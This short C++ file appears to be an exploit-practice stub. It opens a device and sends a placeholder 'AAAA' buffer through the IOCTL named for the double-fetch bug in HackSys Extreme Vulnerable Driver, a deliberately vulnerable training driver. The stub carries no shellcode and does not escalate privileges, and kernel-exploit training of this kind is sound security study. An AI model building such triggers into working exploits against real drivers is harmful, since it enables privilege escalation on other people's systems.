#include "Base.h"

int main()
{
	getchar();
	std::tr1::shared_ptr<BaseIoctl> bp(new BaseIoctl());
	std::string payloads = "AAAA";

	// Open Device 
	bp->OpenDevice();
	bp->sendData(payloads, HACKSYS_EVD_IOCTL_DOUBLE_FETCH);

	bp->CloseDevice();
	return 0;
}